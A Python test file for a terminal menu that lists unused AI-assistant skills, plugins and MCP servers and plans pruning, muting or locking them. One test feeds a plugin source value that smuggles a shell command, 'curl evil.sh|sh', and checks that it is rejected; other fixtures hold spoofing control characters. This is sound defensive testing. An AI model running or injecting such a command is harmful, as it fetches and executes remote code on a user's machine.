#!/usr/bin/env python3
"""Self-check for the menu's logic: python3 test_menu.py. Needs no terminal and no local data: it runs on a copy with a fixture."""
import curses
import glob
import json
import os
import shutil
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))


def row(name, verdict="REAP", tokens=100, category="skill", source="personal", **extra):
    return {"Category": category, "Name": name, "Platform": "claude-code", "Source": source, "Path": f"/p/{name}", "Verdict": verdict,
            "Reason": "unused" if verdict == "REAP" else "", "Tokens": tokens, "Uses": 0, "Removable": True, "Description": "d", **extra}


FIXTURE = {"Rows": [row("pruneme"), row("muteme", "MUTE"), row("lockme", "KEEP"), row("odd", "WAT"), row("srv", "MUTE", 500, "mcp"),
                    row("skillreaper:reap", source="plugin:skillreaper@m"), row("skillreaper-notes"), row("reap"), "junk", {"Name": None},
                    row("bad", tokens=float("inf")), row("cr\rSPOOF")],
           "DeadTokensPerSession": 1000, "MoneyPerMonth": 1.0, "Sessions": 50, "WindowDays": 7}


class FakeWindow:
    """Bytes in, as curses with keypad off would hand them over."""

    def __init__(self, data):
        self.data = list(data)

    def timeout(self, _ms):
        pass

    def clearok(self, _flag):
        pass

    def getch(self):
        return self.data.pop(0) if self.data else -1


def check_terminal(t):
    # Terminal.app with Shift+Return bound to ESC CR, as Claude Code's setup does: that is Shift+Enter.
    fake = type("W", (), {"seq": [13], "timeout": lambda self, ms: None, "getch": lambda self: self.seq.pop(0) if self.seq else -1})()
    assert t._after_esc(fake) == t.SHIFT_ENTER
    read = lambda data: t.read_key(FakeWindow(data), 0)
    table = [(b"\x1b[A", curses.KEY_UP), (b"\x1bOB", curses.KEY_DOWN), (b"\x1b[1;2B", curses.KEY_SF), (b"\x1b[13;2u", t.SHIFT_ENTER),
             (b"\x1b[27;2;13~", t.SHIFT_ENTER), (b"\x1bOM", 10), (b"\x1b", 27), (b"Q", ord("q")), (b"J", ord("J")), (b"\x0c", curses.KEY_RESIZE)]
    for data, want in table:
        assert read(data) == want, data
    for ignored in (b"\x1b[25~", b"\x1by", b"\x1bOq", b"\x1b]11;rgb:1e/2e/da\x07", b"\x1bP>|iTerm2 3.5\x1b\\", b"\x1b[O", b"\x1b[200~deleted\nquit\x1b[201~", b"\x1b[1;2D"):
        assert read(ignored) == -1, ignored
    assert read(b"\x1b[M\x20\x44\x2a") == curses.KEY_MOUSE and t.last_mouse() == t.Mouse(35, 9, "press")
    assert read(b"\x1b[M\x40\x44\x2b") == curses.KEY_MOUSE and t.last_mouse().kind == "drag"
    assert read(b"\x1b[M\x23\x44\x2b") == curses.KEY_MOUSE and t.last_mouse().kind == "release"
    assert read(b"\x1b[<0;235;9M") == curses.KEY_MOUSE and t.last_mouse() == t.Mouse(234, 8, "press")
    assert read(b"\x1b[<0;235;9m") == curses.KEY_MOUSE and t.last_mouse().kind == "release"
    for not_a_click in (b"\x1b[M\xa0\x44\x2a", b"\x1b[M\x30\x44\x2a", b"\x1b[<16;5;5M", b"\x1b[<2;5;5M"):
        read(not_a_click)
        assert t.last_mouse().kind == "other", not_a_click
    assert read(b"\x1b[<64;5;5M") == curses.KEY_MOUSE and t.last_mouse().kind == "wheel_up"
    assert read(b"\x1b[M\x61\x44\x2a") == curses.KEY_MOUSE and t.last_mouse().kind == "wheel_down"
    for data, want in ((b"\x1b[5~", curses.KEY_PPAGE), (b"\x1b[6~", curses.KEY_NPAGE), (b"\x1b[H", curses.KEY_HOME), (b"\x1bOF", curses.KEY_END), ("й".encode(), t.NON_LATIN), ("€".encode(), t.NON_LATIN)):
        assert read(data) == want, data
    assert t.parse_background(b"\x1b]11;rgb:ffff/ffff/f0f0\x07") is True and t.parse_background(b"\x1b]11;rgb:1e/2e/da\x07") is False and t.parse_background(b"junk") is None
    assert t.is_apply(t.SHIFT_ENTER, lambda: False)
    assert t.is_apply(ord("x"), lambda: False) == (not t.SHIFT_READABLE), "x applies only where Shift cannot be read"
    assert t.is_apply(10, lambda: True) and not t.is_apply(10, lambda: True, pending=False) and not t.is_apply(10, lambda: False)
    try:
        t.read_key(FakeWindow(b""))
    except EOFError:
        pass
    else:
        raise AssertionError("a closed stdin must end the wait")


def check_text(p):
    assert p.visible("a\rb\x1b\x00") == "a�b��"
    assert p.visible("safe‮eteled") == "safe�eteled"
    assert p.visible("e" + "́" * 70 + "x") == "é́x"
    assert p.prose("a\n\tb​c") == "a b c"
    assert p.cells("漢a") == 3 and p.cut("漢漢", 3) == "漢" and p.pad("漢", 4) == "漢  "
    a, b = (p.cut_mid(f"acme-internal-deployment-pipeline-{x}", 20) for x in ("production", "staging"))
    assert a != b and len(a) == 20 and a.endswith("production")
    assert p.count(float("nan")) == 0 and p.count(-3) == 0 and p.count(1234.5) == 1234 and p.count(True) == 0 and p.count(None) == 0


def check_money(q):
    saved = dict(q.R)
    try:
        q.R.update(sym="kr.", decimal=",", group=".", digits=2, rate=1.0)
        assert q.amount(1234.5) == "kr.1.234,50"
        q.R.update(sym="$", decimal=".", group=",", digits=0)
        assert q.amount(121116.56) == "$121,117"
        assert q.tokens(1234567) == "1,234,567"
    finally:
        q.R.update(saved)
    assert q.plural(1, "item") == "1 item" and q.plural(2, "item") == "2 items"
    assert q.fit_title("x" * 5000, 7) and q.fit_title("abc", -1) == ""
    assert q.suggestion_line(row("k", "KEEP")) == "reap suggests lock"
    assert q.suggestion_line(row("m", "-", Reason="muted")) == "already muted"


def check_plan(m, key):
    by_name = {r["Name"]: r for r in m.ROWS}
    prune, mute = by_name["pruneme"], by_name["muteme"]
    plan, sweep = m.Plan(), {}
    # a, n, space, a: the manual prune already matches reap, so one a must not empty it.
    m.auto(plan, sweep, [prune])
    plan.pop(key(prune), None)
    plan[key(prune)] = "prune"
    m.auto(plan, sweep, [prune])
    assert plan.get(key(prune)) == "prune"
    # l, a, n, m, a: a lock cleared with n stays gone.
    plan = m.Plan()
    plan[key(mute)] = "lock"
    m.auto(plan, sweep, [mute])
    plan.pop(key(mute), None)
    plan[key(mute)] = "mute"
    m.auto(plan, sweep, [mute])
    assert plan.get(key(mute)) == "mute"
    # A second a puts back what the boxes held, on every row, also when a row came in twice.
    plan = m.Plan()
    plan[key(mute)] = "lock"
    m.auto(plan, sweep, [mute, prune, mute])
    assert plan[key(mute)] == "mute" and plan[key(prune)] == "prune"
    assert m.auto(plan, sweep, [mute, prune, mute]) == "reap's choice undone"
    assert plan.get(key(mute)) == "lock" and key(prune) not in plan
    # Nothing changed, nothing undone.
    plan = m.Plan()
    undecided = by_name["odd"]
    # a on 'not sure, you decide' takes the same choice a click takes, over any state; the second a puts it back.
    said = m.auto(plan, sweep, [undecided])
    assert plan[key(undecided)] == m.best(undecided) and said.startswith("reap chose: 1 "), said
    assert m.auto(plan, sweep, [undecided]) == "reap's choice undone" and key(undecided) not in plan
    plan[key(undecided)] = "lock"
    m.auto(plan, sweep, [undecided])
    assert plan[key(undecided)] == m.best(undecided)
    m.auto(plan, sweep, [undecided])
    assert plan[key(undecided)] == "lock"
    # A group whose unused rows nothing can act on still acts on the rows it can: space is not refused.
    stuck = dict(row("stuck"), Plugin="pl", Source="plugin:pl", Category="mcp")
    plain = dict(row("plain", "REVIEW"))
    # A key on a group reaches every row in it but those reap says to keep.
    kept = by_name["lockme"]
    assert m.row_items(("g", 0, "x", [stuck, plain, kept])) == [stuck, plain]
    assert m.row_items(("g", 0, "x", [kept])) == [kept]
    # Space, a click and a all take reap's own choice. On a muted row it has none: u undoes the mute.
    muted = dict(row("was", "-"), Reason="muted")
    assert m.best(muted) is None and m.click_choice(muted) is None
    assert m.best(by_name["lockme"]) == "lock" and m.best(by_name["muteme"]) == "mute"
    assert m.auto(m.Plan(), {}, [muted]).startswith("reap chose nothing")
    # A muted plugin row can still be pruned: it is the user's choice.
    plug = dict(row("pl:x", "-", source="plugin:pl"), Reason="muted", Plugin="pl")
    assert m.can(plug, "prune") and m.can(plug, "delete")
    # Pruned items are listed as muted ones are, and u brings them back; nothing else applies, and reap chooses nothing.
    gone = {**row("old"), "Reason": "pruned", "Removable": False, "PruneId": "012"}
    assert m.suggestion(gone) == "pruned" and m.best(gone) is None and not m.read_only(gone)
    assert m.existing(gone) == "prune" and m.EXISTING_UNDO["prune"] == "restore"
    assert not any(m.can(gone, v) for v in ("prune", "mute", "lock", "delete")), "only u applies"
    assert "u brings it back" in m.why_not(gone, "mute")
    assert m.row_tag(gone, "restore") == "undo" and m.row_tag(by_name["muteme"], "unmute") == "undo"
    # The line under the list adds up every choice by action, in a fixed order, not the last key pressed.
    logic = sys.modules["menu_logic"]
    assert logic.plan_summary({"a": "lock", "b": "prune", "c": "unmute", "d": "prune", "e": "restore", "f": "disable"}) == "prune 2 · plugin off 1 · lock 1 · undo 2"
    assert logic.plan_summary({}) == ""
    assert logic.is_echo("43 pruned") and logic.is_echo("76 pruned · 9 muted") and logic.is_echo("reap chose: 3 prune · 1 mute")
    assert not logic.is_echo("1 cannot be muted: it is pruned") and not logic.is_echo("⚠ 3 marked for delete: cannot be restored")
    # A key on a group says plainly what it left out and why, and those rows say so too, until the next key.
    logic = sys.modules["menu_logic"]
    left = dict(row("srv2", "REVIEW", category="mcp"), Description="")
    plan = m.Plan()
    said = logic.act_on(plan, {}, {}, [by_name["pruneme"], left], "m")
    assert "1 muted" in said and "1 cannot be muted: srv2: an MCP server has nothing to mute, p prunes it" in said, said
    assert key(left) not in plan and plan.refused == {key(left): "mute"}
    assert m.row_tag(left, None, plan.refused.get(key(left))) == "can't mute" and m.row_tag(by_name["pruneme"], "mute", None) != "can't mute"
    logic.act_on(plan, {}, {}, [by_name["pruneme"]], "n")
    assert plan.refused == {}
    # F034: the second a puts back what stood before that press, not before the first a ever.
    plan = m.Plan()
    plan[key(mute)] = "lock"
    m.auto(plan, sweep, [mute])
    m.auto(plan, sweep, [mute, prune])
    m.auto(plan, sweep, [mute, prune])
    assert plan[key(mute)] == "mute" and key(prune) not in plan
    # F043, F129, F211: plugin off is all or nothing.
    a, b = row("pa", source="plugin:foo@m"), row("pb", source="plugin:foo@m")
    plan = m.Plan()
    plan[key(a)] = "disable"
    plan[key(b)] = "disable"
    plan[key(a)] = "lock"
    assert plan == {key(a): "lock"} and plan.take_ended() == "plugin:foo@m" and plan.take_ended() is None
    plan = m.Plan()
    plan[key(a)] = "disable"
    plan[key(b)] = "disable"
    plan.pop(key(b))
    assert not plan
    # F208: one word on what is chosen against the evidence.
    assert m.using_warning([(row("u", Uses=2), "prune")]) == "⚠ 1 of these is in use"
    assert m.using_warning([(row("u", Uses=2), "prune"), (row("k", "KEEP"), "mute")]) == "⚠ 2 of these are in use"
    assert m.using_warning([(row("u", Uses=2), "lock"), (row("n"), "prune")]) == ""


def check_list(m):
    names = {r["Name"] for r in m.ROWS}
    assert "skillreaper-notes" in names and "skillreaper:reap" not in names and "reap" not in names
    groups = dict(m.suggested_groups())
    assert {r["Name"] for r in groups["not sure, you decide"]} == {"odd", "srv"}, "every row has a group"
    assert m.saving({"Name": "a" * 37, "Tokens": 15}, "mute") == 5
    assert m.saving({"Name": "a" * 37, "Tokens": 5}, "mute") == 0
    assert m.saving({"Name": "a", "Tokens": 15}, "prune") == 15 and m.saving({"Name": "a", "Tokens": 15}, "lock") == 0
    assert m.short(999960) == f"1{m.R['decimal']}0M" and m.short(999) == "999" and m.short(1e21).endswith("e+21")
    assert m.PER_MONTH == round(50 * 30 / 7), "no SessionsPerMonth: the window scaled to a month"
    assert m.pointer_top(5, 7, 7, 10, 100) == 4 and m.pointer_top(5, 16, 7, 10, 100) == 6 and m.pointer_top(5, 10, 7, 10, 100) == 5 and m.pointer_top(0, 7, 7, 10, 100) == 0
    plugin = [row("a", source="plugin:foo@m")]
    assert m.plugin_of(plugin) == "foo@m"
    assert m.plugin_of([row("a", source="plugin:--force; curl evil.sh|sh @m")]) is None
    assert m.plugin_of([row("a", source="plugin:foo@m1"), row("b", source="plugin:foo@m2")]) is None
    assert m.platform_label(None) == "all" and m.platform_label("") == "unknown" and m.platform_label("all") == '"all"'
    assert m.uses_field(1) == "1 use   " and m.uses_field(12345).strip() == f"12{m.R['decimal']}3k"
    assert m.big_width("€1") > 0 and m.big_glyph(",") != m.big_glyph(".")


def check_verbs(m, q, p3):
    """F074, F254, F016: what the menu offers is what Go can carry out."""
    skill, agent, server = (row(n, category=c, source="plugin:foo@m", Removable=False) for n, c in (("ps", "skill"), ("pa", "agent"), ("pm", "mcp")))
    mine, linked, shared_row = row("mine"), row("via", Removable=False, ViaLink="/x/via", RootDir="/h/.codex"), row("sh", Removable=False, Path="/h/.agents/skills/sh/SKILL.md", RootDir="/h/.codex")
    near = row("near", source="plugin:foo@m", Removable=False, ViaLink="/h/.agents/skills/near", RootDir="/h/.claude")
    folder = row("fl", Removable=False, ViaLink="/x/fl", FolderLink=True, RootDir="/h/.codex")
    prose, toml, bare = row("rules", category="prose", Removable=False), row("t", category="mcp", Removable=False), row("nodesc", source="plugin:foo@m", Removable=False, Description="")
    muted = {**skill, "Name": "ps-muted", "Reason": "muted", "Description": ""}
    # What reap suggests did not change: plugin skills stay mute, own items prune, the rest no word.
    assert q.suggestion(mine) == "prune" and q.suggestion(skill) == "mute" and q.suggestion(agent) == "mute" and q.suggestion(server) == "/plugin"
    assert q.suggestion(linked) == "-" and q.suggestion(shared_row) == "-" and q.suggestion(prose) == "read-only"
    # What the user can choose: everything Go can physically do.
    assert m.best(skill) == "mute" and m.best(mine) == "prune" and m.best(server) == "prune" and m.best(linked) == "prune" and m.best(shared_row) == "mute"
    for r in (mine, skill, agent, server, linked, shared_row, near, muted):
        assert p3.can(r, "prune") and p3.can(r, "delete") and p3.can(r, "lock"), r["Name"]
    assert {label: ok for label, ok in q.card_options(skill)} == {"nothing": True, "lock": True, "mute": True, "prune": True, "delete": True}
    assert {label: ok for label, ok in q.card_options(server)} == {"nothing": True, "lock": True, "mute": False, "prune": True, "delete": True}
    # The refusals left, each with its one line.
    assert not p3.can(server, "mute") and "nothing to mute" in p3.why_not(server, "mute") and not p3.can(bare, "mute") and "no description" in p3.why_not(bare, "mute")
    assert not p3.can(muted, "mute") and "muted already" in p3.why_not(muted, "mute")
    assert not p3.can(linked, "mute") and "outside" in p3.why_not(linked, "mute") and p3.can(near, "mute") and p3.can(shared_row, "mute")
    assert not p3.can(folder, "prune") and not p3.can(folder, "delete") and "whole" in p3.why_not(folder, "prune")
    assert not p3.can(toml, "prune") and "by hand" in p3.why_not(toml, "prune") and not p3.can(prose, "prune") and not p3.can(prose, "mute") and p3.can(prose, "lock") and "by hand" in p3.why_not(prose, "delete")
    assert not p3.can(mine, "disable") and "not in a plugin" in p3.why_not(mine, "disable") and p3.can(skill, "disable")
    assert m.state_box(prose, {}) == "   " and m.state_box(prose, {p3.key(prose): "lock"}) == "[l]" and m.state_box(linked, {}) == "[ ]"
    assert p3.read_only(prose) and p3.read_only(toml) and not p3.read_only(linked) and not p3.read_only(shared_row) and not p3.read_only(skill)
    # A key on a group: every row that can take it, and it names the ones that cannot.
    plan, sweep = m.Plan(), {}
    said = m.act_on(plan, sweep, {}, [skill, server, mine, prose], "p")
    assert [plan.get(p3.key(r)) for r in (skill, server, mine, prose)] == ["prune", "prune", "prune", None] and "3 pruned" in said and "1 cannot be pruned: rules: " in said
    plan = m.Plan()
    said = m.act_on(plan, sweep, {}, [skill, server, muted, mine], "m")
    assert plan.get(p3.key(skill)) == "mute" and plan.get(p3.key(mine)) == "mute" and p3.key(server) not in plan and "1 cannot be muted: pm: " in said
    plan = m.Plan()
    assert "cannot be deleted" not in m.act_on(plan, sweep, {}, [muted, skill], "d") and plan[p3.key(muted)] == "delete" and plan[p3.key(skill)] == "delete"
    assert "u takes back" in m.act_on(plan, sweep, {}, [mine], "u")
    assert m.plugins_in([skill, mine, {**skill, "Source": "plugin:bar@m"}, row("bad", source="plugin:$(x)")]) == ["plugin:bar@m", "plugin:foo@m"]
    # Counted like any other row: the bar, the credit, the saving.
    plan = m.Plan()
    plan[p3.key(skill)] = "prune"
    assert m.saving(skill, "prune") == 100 and m.group_stats([skill], plan)["saved"] == 100 and m.consume_plan(plan, {}) == {p3.key(skill): "prune"}
    # The receipt says what comes of it.
    assert m.update_warning([(skill, "prune"), (server, "delete"), (mine, "prune"), (agent, "mute")]) == "⚠ 2 plugin items may return with an update"
    assert m.update_warning([(mine, "prune"), (skill, "mute")]) == ""
    assert m.shared_folders([(near, "mute")]) == ["/h/.agents/skills"] and m.shared_folders([(shared_row, "mute")]) == ["/h/.agents/skills"]
    assert m.removed_for_others([(shared_row, "prune"), (linked, "prune"), (mine, "delete")]) == ["/h/.agents/skills"]
    assert m.plugin_target([skill, agent]) == ("plugin:foo@m", "foo@m") and m.plugin_target([mine]) is None and m.plugin_target([skill, mine]) is None
    # F189: where else a mute reaches.
    far = {**mine, "LinkTarget": "/shared/skills/mine"}
    assert m.shared_folders([(far, "mute")]) == ["/shared/skills"] and m.shared_folders([(far, "prune")]) == []
    # F301: one rule for small amounts.
    assert q.money_figure(0) == f"{q.R['sym']}0" and q.money_figure(0.001).startswith("<")
    # F027: the tag is the report's, the row is a normal one.
    assert m.row_tag({**mine, "MuteLost": True}, None) == "mute lost" and m.best({**mine, "MuteLost": True}) == "prune"
    assert m.row_tag({**mine, "Reason": "muted"}, "prune") == "muted", "being muted stays true until apply"
    assert m.row_tag(prose, None) == "read-only" and m.row_tag(linked, None) == "" and m.row_tag(mine, "delete") == "⚠ delete" and m.row_tag({**mine, "Kept": True}, None) == "locked"
    assert m.row_tag({**skill, "PruneLost": True}, None) == "prune lost" and m.best({**skill, "PruneLost": True}) == "mute" and q.suggestion({**skill, "PruneLost": True}) == "mute"
    # F032: mixed reads as mixed, an untouched row reap has no quarrel with does not.
    kept, dead_row = row("k", "KEEP"), row("r")
    assert m.group_box([kept, dead_row], {p3.key(dead_row): "prune"}) == "[p]" and m.group_box([kept, dead_row], {p3.key(kept): "lock"}) == "[-]"


def check_launch(work):
    """The size the menu sees comes from the window, not from what was exported, through the real way in: terminal.launch."""
    code = "import os, sys, terminal\nfor v in ('LINES', 'COLUMNS'):\n    os.environ[v] = '10'\nterminal.problem = lambda: None\nterminal.light_background = lambda: False\nimport curses\nterminal.curses.wrapper = lambda main, *a: main(None, *a)\nterminal.launch(lambda w: print(os.environ.get('LINES'), os.environ.get('COLUMNS')))\n"
    done = subprocess.run([sys.executable, "-B", "-c", code], cwd=work, capture_output=True, text=True)
    assert done.stdout.strip() == "None None", done.stdout + done.stderr


def check_platforms(work):
    """A row costs by its own platform's sessions: the rows' money adds up to the report's, whatever the mix."""
    code = """
import reap_proto7 as q
rows = {r["Name"]: r for r in q.ROWS}
total = sum(r["Tokens"] * q.reach(r) * q.PRICE for r in q.DATA["Rows"] if r["Verdict"] == "REAP")
assert abs(total - 9.0) < 1e-9, total
assert abs(q.reach(rows["busy"]) - 3 * q.reach(rows["quiet"])) < 1e-9
assert q.reach(rows["idle"]) == 0 and q.sessions_of(rows["idle"]) == 0
assert q.why(rows["quiet"]) == "No usage evidence: no session transcripts were found."
"""
    os.mkdir(os.path.join(work, "mix"))
    for f in glob.glob(os.path.join(work, "*.py")):
        shutil.copy(f, os.path.join(work, "mix"))
    rows = [{**row("busy"), "Platform": "a"}, {**row("quiet", EvidenceNote="no session transcripts were found"), "Platform": "b"}, {**row("idle"), "Platform": "c"}]
    with open(os.path.join(work, "mix", "data.json"), "w", encoding="utf-8") as out:
        json.dump({"Rows": rows, "DeadTokensPerSession": 200, "MoneyPerMonth": 9.0, "SessionsPerMonth": 40, "PlatformSessionsPerMonth": {"a": 30, "b": 10}}, out)
    done = subprocess.run([sys.executable, "-B", "-c", code], cwd=os.path.join(work, "mix"), capture_output=True, text=True)
    assert done.returncode == 0, done.stderr


def main():
    with tempfile.TemporaryDirectory() as work:
        for f in glob.glob(os.path.join(HERE, "*.py")):
            shutil.copy(f, work)
        with open(os.path.join(work, "data.json"), "w", encoding="utf-8") as out:
            json.dump(FIXTURE, out, allow_nan=True)
        sys.path.insert(0, work)
        sys.dont_write_bytecode = True
        import terminal
        import reap_proto
        import reap_proto3
        import reap_proto7
        import reap_proto10
        rows = [r for r in reap_proto.DATA["Rows"]]
        assert len(rows) == 11 and all(isinstance(r["Tokens"], int) for r in rows), "non-rows dropped, weights whole numbers"
        check_terminal(terminal)
        check_text(reap_proto)
        check_money(reap_proto7)
        check_plan(reap_proto10, reap_proto3.key)
        check_list(reap_proto10)
        check_verbs(reap_proto10, reap_proto7, reap_proto3)
        check_launch(work)
        check_platforms(work)
    print("ok")


if __name__ == "__main__":
    main()
